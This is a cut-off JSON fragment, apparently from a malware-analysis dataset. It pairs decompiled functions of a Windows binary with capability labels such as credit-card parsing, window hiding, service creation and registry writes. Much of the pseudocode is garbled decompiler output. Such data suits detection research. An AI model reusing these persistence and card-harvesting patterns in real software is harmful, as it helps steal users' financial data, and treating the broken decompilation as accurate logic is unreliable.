        "decompiled_code": "\nvoid fcn.00404020(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.004026c0;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x407010;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 217
    },
    "00404350": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040446c) overlaps instruction at (ram,0x00404469)\n// \n// WARNING: Removing unreachable block (ram,0x00404437)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00404350(uchar *arg_8h, uint *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint8_t uVar2;\n    uint32_t uVar4;\n    uint32_t in_ECX;\n    uint32_t in_EDX;\n    uint32_t unaff_EBX;\n    uint32_t unaff_ESI;\n    ushort in_SS;\n    bool bVar5;\n    char *pcVar3;\n    \n    while( true ) {\n        *arg_8h = 0x12;\n        arg_8h[1] = 0x3d;\n        arg_8h[2] = 0x76;\n        bVar5 = SBORROW4(unaff_ESI | 0x561b, in_EDX);\n        arg_8h[3] = 0xcd;\n        if ((!bVar5) && (bVar5)) {\n            LOCK();\n            unaff_ESI = 0x138b2633;\n        }\n        arg_8h[4] = 0x35;\n        bVar5 = (POPCOUNT(in_EDX & 0x66) & 1U) == 0;\n        arg_8h[5] = 0x67;\n        if ((bVar5) || (!bVar5)) break;\n        puVar1 = segment(in_SS, *0x10 + -0x10);\n        uVar4 = *puVar1;\n        in_EDX = 0xb7bc9ea5;\n        if (!bVar5) break;\n        uVar2 = uVar4 ^ *(uVar4 + 0xc5804ff3);\n        pcVar3 = uVar4 & 0xffffff00 | uVar2;\n        in_EDX = CONCAT22(0xb7bc, CONCAT11(-0x62 - (unaff_EBX >> 8), 0xa5));\n        unaff_EBX = CONCAT11(0x72, unaff_EBX);\n        *pcVar3 = *pcVar3 + uVar2;\n    }\n    arg_8h[6] = 0x81;\n    arg_8h[7] = 0x4e;\n    arg_8h[8] = 10;\n    bVar5 = (in_ECX & 0xffff0000 | CONCAT11((in_ECX >> 8) - unaff_EBX, in_ECX)) == in_EDX;\n    arg_8h[9] = 0x1f;\n    if ((bVar5) || (!bVar5)) {\n        arg_8h[10] = 0xf4;\n    }\n    *arg_ch = 0xb;\n    return;\n}\n",
        "token_count": 649
    },
    "00401000": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401000(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    // [00] -r-x section size 20480 named .text\n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x407010, 0x423638, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 != 0) {\n        (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 154
    },
    "00401110": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00401110(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    char *var_4h;\n    \n    var_4h = NULL;\n    iVar2 = fcn.00402760(&var_4h);\n    if (iVar2 == 0) {\n        return false;\n    }\n    if (var_4h == NULL) {\n        return false;\n    }\n    uVar3 = 0xffffffff;\n    pcVar4 = var_4h;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x411374, 0x4113b4, 1, var_4h, ~uVar3 - 1);\n    return iVar2 == 0;\n}\n",
        "token_count": 246
    },
    "null": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl main(uint argv)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    uint lpMsg;\n    \n    iVar4 = fcn.00404020(argv);\n    if ((iVar4 != 0) && (iVar5 = fcn.00401000(argv),  pcVar3 = _sym.imp.USER32.dll_GetMessageA,  iVar5 != 0)) {\n        iVar5 = (*_sym.imp.USER32.dll_GetMessageA)(&lpMsg, 0, 0, 0);\n        pcVar2 = _sym.imp.USER32.dll_TranslateMessage;\n        pcVar1 = _sym.imp.USER32.dll_GetDesktopWindow;\n        while (iVar5 != 0) {\n            (*pcVar2)(&lpMsg);\n            (*pcVar1)();\n            (*_sym.imp.USER32.dll_DispatchMessageA)(&lpMsg);\n            iVar5 = (*pcVar3)(&lpMsg, 0, 0, 0);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 240
    },
    "00401580": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x004015e1)\n\nbool fcn.00401580(void)\n\n{\n    int32_t iVar1;\n    uint var_10ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x104;\n    iVar1 = fcn.00402560(0x80000002, 0x41148c, 0x4114cc, &var_8h, &var_10ch, &var_4h);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.MSVCRT.dll__access)(&var_10ch, 0);\n        return iVar1 != -1;\n    }\n    return false;\n}\n",
        "token_count": 176
    },
    "00401610": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401775) overlaps instruction at (ram,0x00401773)\n// \n\nulong __fastcall fcn.00401610(uint16_t param_1, uint32_t param_2, char *param_3)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    char cVar3;\n    char *in_EAX;\n    char *pcVar4;\n    char *pcVar5;\n    uint32_t uVar6;\n    uint16_t uVar7;\n    uint32_t uVar8;\n    uint8_t uVar9;\n    uchar *puVar10;\n    char *unaff_ESI;\n    char *pcVar11;\n    char *pcVar12;\n    char **unaff_EDI;\n    bool bVar13;\n    uchar in_ZF;\n    char in_SF;\n    char in_OF;\n    ushort uStack20;\n    ushort uStack18;\n    \n    puVar10 = &stack0xfffffffc;\n    if (in_OF == in_SF) {\n        if (in_OF == in_SF) goto code_r0x0040162b;\n        puVar10 = &stack0xfffffffd;\n        param_2 = param_2 & 0xffff0000 | CONCAT11(param_2 >> 8 | unaff_ESI, param_2);\n        *in_EAX = *in_EAX + param_1;\n        in_ZF = *in_EAX == '\\0';\n        param_3 = unaff_ESI;\n        unaff_ESI = in_EAX;\n    }\n    else {\ncode_r0x0040162b:\n        *param_3 = '\\x0e';\n    }\n    pcVar12 = unaff_ESI;\n    if ((!in_ZF) && (in_ZF)) {\n        param_3 = param_3 & 0xffffff00 | *0x4bb148d3;\n        pcVar12 = unaff_ESI + 1;\n        out(*unaff_ESI, param_2);\n    }\n    param_3[1] = '\\x05';\n    uVar8 = param_1;\n    pcVar4 = *(puVar10 + 8);\n    do {\n        pcVar4[2] = 'u';\n        pcVar4[3] = '\\x17';\n        pcVar5 = *(puVar10 + 8);\n        pcVar5[4] = -0x75;\n        uStack20 = SUB42(pcVar5, 0);\n        uStack18 = pcVar5 >> 0x10;\n        uVar7 = uVar8 | 0x31fd;\n        bVar13 = (POPCOUNT(uVar7 & 0xff) & 1U) == 0;\n        uVar8 = *(puVar10 + 8);\n        *(uVar8 + 5) = 0x90;\n        uVar9 = param_2;\n        if (uVar7 < 0) {\ncode_r0x004016c1:\n            *(uVar8 + 6) = 0x12;\n            if ((bVar13) || (pcVar4 = pcVar5,  pcVar11 = pcVar12,  !bVar13)) goto code_r0x004016e4;\n        }\n        else {\n            uStack18 = uVar8;\n            if (uVar7 >= 0) goto code_r0x004016c1;\n            uVar8 = uVar8 + 1 & 0xffffff00 | uVar8 + 1 + *unaff_EDI;\n            cVar3 = pcVar12;\n            *pcVar12 = *pcVar12 + cVar3;\n            puVar1 = pcVar12 + -0x74f06f70;\n            uVar2 = *puVar1;\n            *puVar1 = *puVar1 + uVar9;\n            *pcVar12 = *pcVar12 + cVar3 + CARRY1(uVar2, uVar9);\n            *pcVar12 = *pcVar12 + cVar3;\n            pcVar4 = pcVar12;\n            pcVar11 = pcVar5;\n        }\n        pcVar12 = *unaff_EDI;\n        *unaff_EDI = pcVar11;\n        puVar10 = puVar10 + -*(puVar10 + 0x5f9dff63);\n    } while (puVar10 < 0);\n    pcVar5 = pcVar4;\n    if (pcVar12 < 0) {\ncode_r0x004016e4:\n        *(uVar8 + 7) = 0xce;\n        *(uVar8 + 8) = 6;\n        *(uVar8 + 9) = 0x8c;\n        *(uVar8 + 10) = 0x20;\n        uStack20 = SUB42(pcVar5, 0);\n        uStack18 = pcVar5 >> 0x10;\n    }\n    *(uVar8 + 0xb) = 0xe0;\n    uVar6 = CONCAT22(uStack18, uStack20);\n    *(uVar8 + 0xc) = 0x57;\n    if ('P' < uVar9) {\n        if (uVar9 < 'Q') {\n            uVar6 = pcVar12 | 0x6651663b;\n            goto code_r0x0040177d;\n        }\n    }\n    *(uVar8 + 0xd) = 0x3b;\ncode_r0x0040177d:\n    **(puVar10 + 0xc) = 0xe;\n    return CONCAT44(param_2, uVar6);\n}\n",
        "token_count": 1231
    },
    "004017b0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004017b0(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00401610(&var_68h, &var_4h);\n    fcn.004029b0(&var_68h, var_4h, 0x407014, 0xa180);\n    *arg_8h = 0x407014;\n    *arg_ch = 0xa180;\n    return;\n}\n",
        "token_count": 237
    },
    "004021f0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402419) overlaps instruction at (ram,0x00402410)\n// \n\nvoid fcn.004021f0(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int16_t extraout_CX;\n    char extraout_CH;\n    ushort extraout_DX;\n    int32_t extraout_EDX;\n    uint *puVar3;\n    uint *unaff_EBP;\n    uchar *unaff_ESI;\n    uchar *puVar4;\n    uint16_t unaff_DI;\n    uchar in_CF;\n    uchar in_ZF;\n    bool bVar5;\n    uint uStack36;\n    uint uStack28;\n    uint uStack24;\n    \n    uStack24 = 0x15;\n    uStack28 = 0x411194;\n    uVar2 = fcn.00402610();\n    if ((!in_CF && !in_ZF) && (in_CF || in_ZF)) {\n        in_ZF = (uVar2 & 0xe2f4cc58) == 0;\n    }\n    fcn.00402610();\n    puVar4 = unaff_ESI;\n    if ((!in_ZF) && (in_ZF)) {\n        puVar4 = unaff_ESI + 1;\n        out(*unaff_ESI, extraout_DX);\n    }\n    fcn.00402610();\n    uStack24 = 0x15;\n    uStack28 = 0x411194;\n    fcn.00402610();\n    bVar5 = (extraout_CX - 1U & unaff_DI | 0x61be) == 0;\n    uStack24 = 0x15;\n    uStack28 = 0x411194;\n    fcn.00402610();\n    if ((!bVar5) && (bVar5)) {\n        puVar3 = &stack0xffffffe0;\n        cVar1 = '\\x10';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar3 = puVar3 + -1;\n            *puVar3 = *unaff_EBP;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n    }\n    fcn.00402610(0x411194, 0x15, 0x4115a0, 0x12);\n    fcn.00402610(0x411194, 0x15, 0x4115b4, 0x12);\n    fcn.00402610(0x411194, 0x15, 0x4115c8, 2);\n    fcn.00402610(0x411194, 0x15, 0x4115cc, 8);\n    fcn.00402610(0x411194, 0x15, 0x4115d4, 8);\n    fcn.00402610(0x411194, 0x15, 0x4115dc, 6);\n    fcn.00402610(0x411194, 0x15, 0x4115e4, 7);\n    fcn.00402610(0x411194, 0x15, 0x4115ec, 7);\n    fcn.00402610(0x411194, 0x15, 0x4115f4, 6);\n    *(puVar4 + 0x43d1773a) = *(puVar4 + 0x43d1773a) ^ 0x6a27e95e;\n    *(extraout_EDX + 0x15) = *(extraout_EDX + 0x15) + extraout_CH;\n    fcn.00402610(0x411194);\n    fcn.00402610(0x411194);\n    return;\n}\n",
        "token_count": 854
    },
    "00402460": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00402460(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *puVar4;\n    uint *unaff_EBP;\n    bool in_PF;\n    \n    if ((!in_PF) && (in_PF)) {\n        puVar4 = &stack0xfffffffc;\n        cVar1 = '\\x1e';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar4 = puVar4 + -1;\n            *puVar4 = *unaff_EBP;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        iVar2 = in(0x78);\n        return iVar2;\n    }\n    iVar2 = *0x42363c;\n    if (*0x42363c == 0) {\n        uVar3 = (*_sym.imp.MSVCRT.dll_time)();\n        iVar2 = (*_sym.imp.MSVCRT.dll_srand)(uVar3);\n        *0x42363c = 1;\n    }\n    return iVar2;\n}\n",
        "token_count": 246
    },
    "00402760": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get session user name"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402806) overlaps instruction at (ram,0x00402804)\n// \n\nuint __cdecl fcn.00402760(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    ulong uVar3;\n    uint var_31ch;\n    uint lpBuffer;\n    uint var_114h;\n    uint var_10h;\n    uint pcbBuffer;\n    uint var_8h;\n    uint var_4h;\n    \n    pcbBuffer = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(&lpBuffer, &pcbBuffer);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    var_4h = 0x104;\n    var_8h = 0x104;\n    uVar3 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)(0, &lpBuffer, &var_114h, &var_4h, &var_31ch, &var_8h, &var_10h);\n    iVar1 = uVar3;\n    if (iVar1 != 0) {\n        if ((iVar1 < 0) || (uVar2 = uVar3 >> 0x20,  iVar1 >= 0)) {\n            uVar2 = arg_8h;\n        }\n        iVar1 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)(&var_114h, uVar2);\n        if (iVar1 != 0) {\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 362
    },
    "00402aa0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00402aa0(uint hSCManager, uint lpServiceName)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.ADVAPI32.dll_DeleteService)();\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return uVar2;\n}\n",
        "token_count": 126
    },
    "00403120": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00403120(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint *in_FS_OFFSET;\n    uint var_24ch;\n    uchar var_148h;\n    uint var_147h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t pbstr;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4050e0;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x411594);\n    if (iVar1 == 0) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_44h = iVar1;\n    uVar2 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)(0x4115a0);\n    (*_sym.imp.USER32.dll_SendMessageTimeoutA)(arg_8h, uVar2, 0, 0, 2, 1000, &var_18h);\n    pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, 0x4115b4);\n    if (pcVar3 == NULL) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_20h = NULL;\n    var_4h = 0;\n    iVar4 = (*pcVar3)(var_18h, str._D_3, 0, &var_20h);\n    if ((iVar4 < 0) || (var_20h == NULL)) {\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    else {\n        var_24h = NULL;\n        var_4h._0_1_ = 1;\n        iVar4 = (**(*var_20h + 0x20))(var_20h, &var_24h);\n        if ((iVar4 < 0) || (var_24h == NULL)) {\n            var_4h = var_4h._1_3_ << 8;\n            if (var_24h != NULL) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            if (var_20h != NULL) {\n                (**(*var_20h + 8))(var_20h);\n            }\n        }\n        else {\n            var_1ch = 0;\n            (**(*var_24h + 0x24))(var_24h, &var_1ch);\n            var_40h = 0;\n            if (0 < var_1ch) {\n                do {\n                    var_2ch = (*_sym.imp.MSVCRT.dll_rand)();\n                    var_2ch = var_2ch % var_1ch;\n                    var_34h = CONCAT22(var_34h._2_2_, 3);\n                    arg_8h = NULL;\n                    var_10h = NULL;\n                    var_4h._0_1_ = 4;\n                    iVar4 = (**(*var_24h + 0x2c))\n                                      (var_24h, var_34h, var_30h, var_2ch, var_28h, var_34h, var_30h, var_2ch, var_28h, \n                                       &arg_8h);\n                    if ((iVar4 < 0) || (arg_8h == NULL)) {\n                        var_4h._0_1_ = 3;\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\njoined_r0x0040353d:\n                        var_4h._0_1_ = 2;\n                        if (arg_8h != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*arg_8h + 8))(arg_8h);\n                        }\ncode_r0x00403549:\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                        break;\n                    }\n                    iVar4 = (***arg_8h)(arg_8h, 0x4061b0, &var_10h);\n                    if (((iVar4 < 0) || (var_10h == NULL)) ||\n                       (iVar4 = (**(*var_10h + 0x38))(var_10h, &pbstr),  iVar4 < 0)) {\njoined_r0x00403504:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (arg_8h != NULL) {\n                            (**(*arg_8h + 8))(arg_8h);\n                        }\n                        goto code_r0x00403549;\n                    }\n                    if (pbstr == 0) {\njoined_r0x00403340:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (arg_8h != NULL) {\n                            (**(*arg_8h + 8))(arg_8h);\n                        }\n                    }\n                    else {\n                        fcn.00402f00(pbstr, &var_24ch, 0x104);\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(pbstr);\n                        iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_24ch, 0x4115c8);\n                        if (iVar1 != 0) goto joined_r0x00403340;\n                        var_14h = NULL;\n                        var_4h._0_1_ = 5;\n                        iVar4 = (***arg_8h)(arg_8h, 0x4061a0, &var_14h);\n                        if ((iVar4 < 0) || (var_14h == NULL)) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\njoined_r0x004034e9:\n                            if (var_10h != NULL) {\n                                var_4h._0_1_ = 3;\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                            goto joined_r0x0040353d;\n                        }\n                        iVar4 = (**(*var_14h + 0x20))(var_14h, &var_3ch);\n                        iVar1 = var_3ch;\n                        if (iVar4 < 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            goto joined_r0x004034e9;\n                        }\n                        if (var_3ch == 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        else {\n                            var_148h = 0;\n                            puVar6 = &var_147h;\n                            for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n                                *puVar6 = 0;\n                                puVar6 = puVar6 + 1;\n                            }\n                            *puVar6 = 0;\n                            *(puVar6 + 2) = 0;\n                            fcn.00402f00(iVar1, &var_148h, 0x104);\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(var_3ch);\n                            iVar1 = fcn.00403040(&var_148h);\n                            if (iVar1 == 0) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(10);\n                                (**(*var_10h + 0x114))(var_10h);\n                                var_4h._0_1_ = 4;\n                                if (var_14h != NULL) {\n                                    (**(*var_14h + 8))(var_14h);\n                                }\n                                goto joined_r0x00403504;\n                            }\n                            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        var_4h._0_1_ = 2;\n                        if (arg_8h != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*arg_8h + 8))(arg_8h);\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                    var_40h = var_40h + 1;\n                } while (var_40h < var_1ch);\n            }\n            var_4h = var_4h._1_3_ << 8;\n            if (var_24h != NULL) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            iVar1 = var_44h;\n            if (var_20h != NULL) {\n                (**(*var_20h + 8))(var_20h);\n                iVar1 = var_44h;\n            }\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar1);\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = var_ch;\n    return iVar4;\n}\n",
        "token_count": 2497
    },
    "00403660": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403660(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_108h;\n    uint var_107h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(arg_8h, &var_4h);\n    if (arg_ch != var_4h) {\n        return 1;\n    }\n    var_108h = 0;\n    puVar2 = &var_107h;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    (*_sym.imp.USER32.dll_GetClassNameA)(arg_8h, &var_108h, 0x104);\n    iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_108h, 0x411570);\n    if (iVar1 != 0) {\n        return 1;\n    }\n    (*_sym.imp.USER32.dll_EnumChildWindows)(arg_8h, 0x4035e0, 0);\n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    (*_sym.imp.KERNEL32.dll_Sleep)((iVar1 % 10 + 4) * 1000);\n    (*_sym.imp.USER32.dll_PostMessageA)(arg_8h, 0x10, 0, 0);\n    return 0;\n}\n",
        "token_count": 375
    },
    "00403960": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004039b3) overlaps instruction at (ram,0x004039ae)\n// \n\nuint __fastcall fcn.00403960(uint param_1, char *param_2)\n\n{\n    uint32_t *puVar1;\n    char cVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    uint8_t extraout_CL;\n    char *unaff_EBX;\n    int32_t unaff_EDI;\n    bool in_CF;\n    bool in_ZF;\n    uint uStack8;\n    \n    if ((in_CF || in_ZF) || (!in_CF && !in_ZF)) {\n        uStack8 = 0;\n    }\n    cVar2 = *unaff_EBX;\n    puVar1 = unaff_EDI + -0x75;\n    puVar3 = *puVar1;\n    *puVar1 = *puVar1 - &uStack8;\n    *param_2 = *param_2 + ((param_1 >> 8) - cVar2) + (puVar3 < &uStack8);\n    iVar4 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)();\n    if (iVar4 != 0) {\n        *(iVar4 + 0x5039da56) = *(iVar4 + 0x5039da56) ^ extraout_CL;\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 326
    },
    "004039d0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403a17) overlaps instruction at (ram,0x00403a16)\n// \n\nuint __cdecl fcn.004039d0(int32_t arg_8h, uint arg_ch)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    uint in_ECX;\n    uint unaff_EBX;\n    int32_t unaff_EDI;\n    bool bVar2;\n    bool bVar3;\n    uint uStack28;\n    uint uStack24;\n    \n    bVar2 = false;\n    bVar3 = (CONCAT11(in_ECX >> 8 & unaff_EBX >> 8, in_ECX | unaff_EBX) & unaff_EDI) == 0;\n    uStack24 = 0;\n    uStack28 = 0;\n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)();\n    if ((!bVar2 && !bVar3) && (bVar2 || bVar3)) {\n        *(unaff_EDI + -0x75) = *(unaff_EDI + -0x75) - &uStack28;\n        arg_8h = unaff_EDI;\n    }\n    fcn.00402aa0(hSCManager, arg_8h);\n    uVar1 = fcn.00403960(hSCManager, arg_8h, arg_ch);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 329
    },
    "00403a50": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403a75) overlaps instruction at (ram,0x00403a73)\n// \n\nuint fcn.00403a50(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *unaff_EBP;\n    code *pcVar4;\n    bool bVar5;\n    uint uStack12;\n    \n    uStack12 = 0x4112a0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    bVar5 = iVar2 == 0;\n    if (bVar5) {\n        return 0;\n    }\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if ((!bVar5) && (bVar5)) {\n        *0xffffff8b = *0xffffff8b - &uStack12;\n        bVar5 = false;\n        pcVar4 = NULL;\n    }\n    *0x423664 = (*pcVar4)();\n    if ((!bVar5) && (bVar5)) {\n        puVar3 = &stack0xffffffe8;\n        cVar1 = '\\x10';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar3 = puVar3 + -1;\n            *puVar3 = *unaff_EBP;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n    }\n    *0x423668 = (*pcVar4)(iVar2);\n    *0x42366c = (*pcVar4)(iVar2, 